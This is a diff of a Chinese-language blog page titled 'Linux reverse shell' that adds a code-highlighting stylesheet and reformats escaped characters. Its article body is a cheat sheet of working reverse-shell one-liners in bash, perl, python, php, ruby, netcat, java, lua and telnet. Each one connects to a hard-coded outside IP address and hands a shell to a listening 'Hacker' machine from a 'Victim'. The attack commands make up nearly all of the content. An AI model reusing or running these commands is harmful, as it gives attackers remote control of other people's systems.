@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,83 +104,57 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>bash版本：</h2>
-
 <pre><code>bash -i &gt;&amp; /dev/tcp/45.78.13.23/4567 0&gt;&amp;1
 
 bash -i &gt;&amp; /dev/tcp/45.78.13.23/5555 0&gt;&amp;1
 
 /bin/tcsh -i &gt;&amp; /dev/tcp/45.78.13.23/4567 0&gt;&amp;1
 </code></pre>
-
 <p>注意这个是由解析shell的bash完成，所以某些情况下不支持</p>
-
 <h2>perl版本:</h2>
-
-<pre><code>perl -e &#39;use Socket;$i=&quot;45.78.13.23&quot;;$p=4567;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+<pre><code>perl -e 'use Socket;$i="45.78.13.23";$p=4567;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
 </code></pre>
-
 <h2>python版本：</h2>
-
-<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;45.78.13.23&quot;,4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.78.13.23",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 </code></pre>
-
 <h2>php版本：</h2>
-
-<pre><code>php -r &#39;$sock=fsockopen(&quot;45.78.13.23&quot;,4567);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+<pre><code>php -r '$sock=fsockopen("45.78.13.23",4567);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
 </code></pre>
-
 <h2>ruby版本：</h2>
-
-<pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;45.78.13.23&quot;,4567).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
+<pre><code>ruby -rsocket -e'f=TCPSocket.open("45.78.13.23",4567).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
 </code></pre>
-
 <h2>nc版本：</h2>
-
 <pre><code>nc -e /bin/sh 45.78.13.23 4567
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 45.78.13.23 4567 &gt;/tmp/f
 nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
 </code></pre>
-
 <h2>java版本</h2>
-
 <pre><code>r = Runtime.getRuntime()
-p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/45.78.13.23/4567;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/45.78.13.23/4567;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
 p.waitFor()
 </code></pre>
-
 <h2>lua版本：</h2>
-
-<pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;45.78.13.23&#39;,&#39;4567&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
+<pre><code>lua -e "require('socket');require('os');t=socket.tcp();t:connect('45.78.13.23','4567');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"
 </code></pre>
-
 <h2>nc不使用-e：</h2>
-
 <pre><code>Hacker:nc -lvnp listenport
 Victim:mknod /tmp/backpipe p
 Victim:/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe
 </code></pre>
-
 <h2>不使用nc</h2>
-
 <h3>Method 1:</h3>
-
 <pre><code>Hacker: nc -nvlpp 8080
 Victim: /bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1
 </code></pre>
-
 <h3>Method 2:</h3>
-
 <pre><code>Hacker: nc -nvlpp8080
 Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe
 </code></pre>
-
 <h3>Method 3:</h3>
-
 <pre><code>Hacker: nc -nvlpp8080
 Hacker: nc -nvlpp8888
 Victim: telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
 </code></pre>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/10/16/linux_shell.html" target="_blank">Linux 反弹 shell</a><br />
